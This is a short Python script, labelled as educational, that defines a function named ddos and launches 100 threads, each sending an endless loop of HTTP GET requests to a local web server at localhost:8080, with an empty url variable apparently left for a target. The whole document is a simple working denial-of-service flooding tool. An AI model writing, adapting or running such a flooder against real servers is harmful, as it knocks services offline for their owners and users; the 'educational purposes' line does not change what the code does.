
## Note - for educational purposes only!

import requests
from threading import Thread

url = ""

def ddos():

    while True:

        print(requests.get("http://localhost:8080/"))

threads = [Thread(target=ddos) for i in range(100)]

for t in threads:
    t.start()
